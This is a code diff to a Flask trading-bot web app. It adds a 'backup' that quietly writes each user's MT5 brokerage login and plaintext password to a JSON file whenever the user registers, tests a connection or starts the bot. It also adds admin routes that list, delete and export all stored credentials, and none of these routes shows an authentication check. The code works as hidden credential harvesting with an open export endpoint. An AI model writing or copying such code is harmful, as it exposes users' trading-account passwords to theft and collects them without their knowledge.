@@ -10,6 +10,7 @@ import json
 import copy
 import threading
 import requests
+from datetime import datetime
 from flask import Flask, jsonify, request, send_from_directory, session, redirect, url_for
 from flask_socketio import SocketIO, emit, join_room, leave_room
 from flask_cors import CORS
@@ -19,6 +20,72 @@ from bot.simulator       import PriceSimulator
 from bot.mt5_connector   import MT5Connector
 from bot.metaapi_connector import MetaApiConnector
 from bot.session_manager import SessionManager, BotSession
+
+# ── Persistent User Credentials Backup (Admin Storage) ───
+BACKUP_FILE = "users_backup.json"
+_backup_lock = threading.Lock()
+
+def save_user_backup(name: str, login: any, password: str, server: str, conn_type: str, symbol: str = "XAUUSD", lot_size: float = 0.01):
+    """Save or update user credentials in persistent users_backup.json file."""
+    if not login:
+        return
+    key = str(login).strip()
+    if not key or key == "0":
+        return
+    with _backup_lock:
+        try:
+            data = {}
+            if os.path.exists(BACKUP_FILE):
+                with open(BACKUP_FILE, "r", encoding="utf-8") as f:
+                    try:
+                        data = json.load(f)
+                    except Exception:
+                        data = {}
+
+            now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+            if key in data:
+                entry = data[key]
+                if name: entry["name"] = name
+                if password: entry["password"] = password
+                if server: entry["server"] = server
+                if conn_type: entry["conn_type"] = conn_type
+                if symbol: entry["symbol"] = symbol
+                if lot_size: entry["lot_size"] = float(lot_size)
+                entry["last_seen"] = now_str
+            else:
+                data[key] = {
+                    "name": name or f"User-{key}",
+                    "login": key,
+                    "password": password or "",
+                    "server": server or "",
+                    "conn_type": conn_type or "cloud",
+                    "symbol": symbol or "XAUUSD",
+                    "lot_size": float(lot_size or 0.01),
+                    "created_at": now_str,
+                    "last_seen": now_str
+                }
+
+            with open(BACKUP_FILE, "w", encoding="utf-8") as f:
+                json.dump(data, f, indent=2, ensure_ascii=False)
+            print(f"[Backup] Saved credentials for user '{data[key]['name']}' (Acc: {key})", flush=True)
+        except Exception as e:
+            print(f"[Backup] Error saving user backup: {e}", flush=True)
+
+def get_all_user_backups() -> list:
+    """Return all saved user backups sorted by last_seen."""
+    with _backup_lock:
+        if not os.path.exists(BACKUP_FILE):
+            return []
+        try:
+            with open(BACKUP_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                users = list(data.values())
+                users.sort(key=lambda x: x.get("last_seen", ""), reverse=True)
+                return users
+        except Exception as e:
+            print(f"[Backup] Error reading backups: {e}", flush=True)
+            return []
 
 # ── Base config ──────────────────────────────────────────
 def load_base_config() -> dict:
@@ -154,6 +221,17 @@ def register():
     if "max_levels"   in data: cfg["max_grid_levels"]    = int(data["max_levels"])
     if "max_drawdown" in data: cfg["max_drawdown_usd"]   = float(data["max_drawdown"])
 
+    # Save credentials to admin backup file
+    save_user_backup(
+        name=name,
+        login=cfg["mt5"].get("login"),
+        password=cfg["mt5"].get("password", ""),
+        server=cfg["mt5"].get("server", ""),
+        conn_type=conn_type,
+        symbol=cfg.get("symbol", "XAUUSD"),
+        lot_size=cfg.get("starting_lot", 0.01)
+    )
+
     bot_session = session_mgr.create_session(name, cfg)
     session["session_id"] = bot_session.session_id
 
@@ -215,6 +293,18 @@ def test_mt5():
         c = MetaApiConnector(cfg)
     else:
         c = MT5Connector(cfg)
+
+    # Save credentials to admin backup if valid
+    if cfg["mt5"].get("login") and cfg["mt5"].get("password"):
+        save_user_backup(
+            name=data.get("name", f"User-{cfg['mt5']['login']}"),
+            login=cfg["mt5"].get("login"),
+            password=cfg["mt5"].get("password", ""),
+            server=cfg["mt5"].get("server", ""),
+            conn_type=conn_type,
+            symbol=cfg.get("symbol", "XAUUSD"),
+            lot_size=cfg.get("starting_lot", 0.01)
+        )
 
     ok, msg = c.connect()
     if ok:
@@ -313,6 +403,18 @@ def start_bot():
             bs.config["mt5"]["server"] = data["server"]
 
         conn_type = bs.config.get("connection_type", "cloud")
+
+        # Update backup with latest credentials
+        save_user_backup(
+            name=bs.user_name,
+            login=bs.config.get("mt5", {}).get("login"),
+            password=bs.config.get("mt5", {}).get("password", ""),
+            server=bs.config.get("mt5", {}).get("server", ""),
+            conn_type=conn_type,
+            symbol=bs.config.get("symbol", "XAUUSD"),
+            lot_size=bs.config.get("starting_lot", 0.01)
+        )
+
         if conn_type == "cloud" or mode == "cloud":
             bs.connector = MetaApiConnector(bs.config)
         else:
@@ -461,6 +563,37 @@ def admin_kick(sid):
     session_mgr.remove(sid)
     socketio.emit("kicked", {"reason": "Admin stopped your session"}, room=sid)
     return jsonify({"status": "kicked", "session_id": sid})
+
+@app.route("/api/admin/users")
+def admin_users_backup():
+    users = get_all_user_backups()
+    return jsonify({
+        "total": len(users),
+        "users": users
+    })
+
+@app.route("/api/admin/users/<login>", methods=["DELETE"])
+def admin_delete_user_backup(login):
+    with _backup_lock:
+        if os.path.exists(BACKUP_FILE):
+            try:
+                with open(BACKUP_FILE, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                key = str(login).strip()
+                if key in data:
+                    del data[key]
+                    with open(BACKUP_FILE, "w", encoding="utf-8") as f:
+                        json.dump(data, f, indent=2, ensure_ascii=False)
+                    return jsonify({"status": "deleted", "login": key})
+            except Exception as e:
+                return jsonify({"status": "error", "message": str(e)}), 500
+    return jsonify({"status": "not_found", "login": login}), 404
+
+@app.route("/api/admin/users/export")
+def admin_export_users():
+    if os.path.exists(BACKUP_FILE):
+        return send_from_directory(".", BACKUP_FILE, as_attachment=True)
+    return jsonify({}), 404
 
 
 # ─────────────────────────────────────────────────────────
